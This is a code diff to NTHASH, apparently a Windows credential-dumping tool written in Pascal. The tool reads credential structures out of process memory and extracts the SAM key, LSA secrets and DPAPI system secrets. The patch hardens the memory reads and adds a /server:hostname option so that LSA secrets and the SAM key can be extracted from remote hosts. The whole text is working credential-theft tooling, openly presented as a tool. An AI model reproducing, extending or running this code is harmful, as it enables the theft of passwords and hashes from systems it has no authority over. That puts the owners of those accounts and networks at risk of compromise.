@@ -670,6 +670,7 @@ begin
                                      log('Prev/Next:'+inttohex(Pgeneric_list (@bytes[0]).unk1,sizeof(nativeuint))+'/'+inttohex(Pgeneric_list (@bytes[0]).unk2,sizeof(nativeuint)),0);
                                      if first=0 then first:=Pgeneric_list (@bytes[0]).unk1;
                                      log('-CREDENTIALW:'+inttohex(ptr-$58  ,sizeof(nativeuint)),1);
+                                     ZeroMemory(@CREDENTIALW,sizeof(CREDENTIALW));
                                      readmem(hprocess,ptr-$58,@CREDENTIALW ,sizeof(CREDENTIALW));
                                      if nativeuint(CREDENTIALW.UserName)>0 then
                                        begin
@@ -685,7 +686,7 @@ begin
                                      //encrypted password is $e0 aka 224 bytes later
                                      //start of credential structure is -$58
                                      //password - $110 is the pointer to the password
-                                     if (CREDENTIALW.CredentialBlobSize>0) and (nativeuint(CREDENTIALW.CredentialBlob)<>0) then
+                                     if (CREDENTIALW.CredentialBlobSize>0) and (CREDENTIALW.CredentialBlobSize<16384) and (nativeuint(CREDENTIALW.CredentialBlob)<>0) then
                                      begin
                                      log('CredentialBlob:'+inttohex(nativeuint(CREDENTIALW.CredentialBlob),sizeof(nativeuint)),0) ;
                                      setlength(password,CREDENTIALW.CredentialBlobSize);
@@ -1024,8 +1025,8 @@ begin
   log('NTHASH /gethash /mode:hashid /input:hexabytes',1);
   log('NTHASH /gethmac /mode:hashid /input:hexabytes /key:hexabytes',1);
   log('NTHASH /getcipher /mode:cipherid /input:hexabytes /key:hexabytes',1);
-  log('NTHASH /getlsasecret /input:secret',1);
-  log('NTHASH /getlsasecret /input:dpapi_system',1);
+  log('NTHASH /getlsasecret /input:secret [/server:hostname]',1);
+  log('NTHASH /getlsasecret /input:dpapi_system [/server:hostname]',1);
   //log('NTHASH /dpapi_system',1);
   //****************************************************
   log('NTHASH /runasuser /user:username /password:password [/binary:x:\folder\bin.exe]',1);
@@ -1325,7 +1326,7 @@ begin
      if getsyskey(syskey) then
         begin
         log('SYSKey:'+ByteToHexaString(SYSKey) ,1);
-        if getsamkey(syskey,samkey)
+        if getsamkey(syskey,samkey,server)
            then log('SAMKey:'+ByteToHexaString(samkey) ,1)
            else log('getsamkey NOT OK, try adding /system' ,1);
         end //if getsyskey(syskey) then
@@ -1623,7 +1624,7 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
   if p>0 then
      begin
      if input='' then exit;
-     if lsasecret(input,output_)=false
+     if lsasecret(server,input,output_)=false
         then log('lsasecrets failed',1)
         else
         begin
@@ -1641,7 +1642,7 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
   if p>0 then
      begin
      input:='dpapi_system';
-     if lsasecret(input,output_)=false
+     if lsasecret('',input,output_)=false
         then log('lsasecrets failed',1)
         else
         begin
